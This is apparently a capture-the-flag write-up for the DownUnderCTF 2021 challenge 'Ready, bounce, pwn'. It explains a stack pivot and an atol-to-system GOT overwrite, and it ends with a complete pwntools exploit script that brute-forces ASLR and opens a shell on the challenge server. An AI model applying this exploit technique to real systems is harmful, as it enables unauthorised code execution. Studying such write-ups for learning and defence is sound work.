![](https://github.com/nobodyisnobody/write-ups/raw/main/DownUnderCTF.2021/pwn/ready.bounce.pwn/pics/description.png)

**"Ready, bounce, pwn"** was a pwn challenge from DownUnderCTF 2021.

A medium difficulty challenge.

A small program, a bit tricky, but not too much.

ok first we check the protections:

![](https://github.com/nobodyisnobody/write-ups/raw/main/DownUnderCTF.2021/pwn/ready.bounce.pwn/pics/checksec.png)

Got entries are writable, and NO PIE, that will be good for us..

Let's start the reversing..

**the main function first:**

![](https://github.com/nobodyisnobody/write-ups/raw/main/DownUnderCTF.2021/pwn/ready.bounce.pwn/pics/reverse.main.png)

**then the second function read_long()**

![](https://github.com/nobodyisnobody/write-ups/raw/main/DownUnderCTF.2021/pwn/ready.bounce.pwn/pics/reverse.read.long.png)

Basically the program ask for a name, and read it as an input of 0x18 bytes on stack.

then ask the user to enter a number with the read_long function,

and convert it to long int , with atol function.

The number is returned, in rax, and added to rbp before the program ends, as you can see at the end of main function.

So the trick, is to send a negative number, -32,  like this rbp will point to our name given in input before on stack..

then ,when the program will reach leave / ret instructions at the end of main, stack will point to our name..

that leaves three ROP entries (0x18 bytes.. ) for our pivot... (we need only two in fact..)

when the instruction LEAVE execute, it will set rsp to rbp value, and first pop rbp register from new stack position.

so the trick is to set the new RBP, to points just before atol function GOT entry, at 0x404047...

and return back inside read_long function at 0x4011b1...

there it will read 0x13 bytes in the got entries..

we will set the two lsb bytes of atol GOT entry, to the address of system() function offset in libc (libc is given),

there will still be 4 bits of aslr to guess.. 1/16 chance to win !!

So with a little bruteforce, it will work...

just before the atol got entry, we put the string '/bin/sh', that will be given to atol (now system) as an argument.

it will do a system('/bin/sh') so....

and that's all.. :)

See it in action:

![](https://github.com/nobodyisnobody/write-ups/raw/main/DownUnderCTF.2021/pwn/ready.bounce.pwn/pics/rbp.gotshell.gif)

**The exploit code:**

```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'

host, port = "pwn-2021.duc.tf","31910"

# return inside read_long function
gadget1 = 0x4011b1
'''
  4011b1:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  4011b5:	ba 13 00 00 00       	mov    edx,0x13
  4011ba:	48 89 c6             	mov    rsi,rax
  4011bd:	bf 00 00 00 00       	mov    edi,0x0
  4011c2:	e8 89 fe ff ff       	call   401050 <read@plt>
  4011c7:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  4011cb:	48 89 c7             	mov    rdi,rax
  4011ce:	e8 9d fe ff ff       	call   401070 <atol@plt>
  4011d3:	c9                   	leave  
  4011d4:	c3                   	ret    
'''

count=0
while (True):
  print(str(count))
  count +=1
  if args.LOCAL:
    p = process('./rbp')
  else:
    p = remote(host,port)
  payload = p64(0x404047)+p64(gadget1)
  p.sendafter('name? ',payload)
  p.sendafter('number? ','-32 '+'B'*15)
  p.send('/bin/sh'.ljust(0x11,'\x00')+'\x60\xda')
  p.sendline('id;')
  try:
    buff = p.recvuntil('uid', timeout=5)
    break
  except:
    p.close()

print(buff)
p.sendline('cat flag*')

p.interactive()
```

*nobodyisnobody still pwning things...*
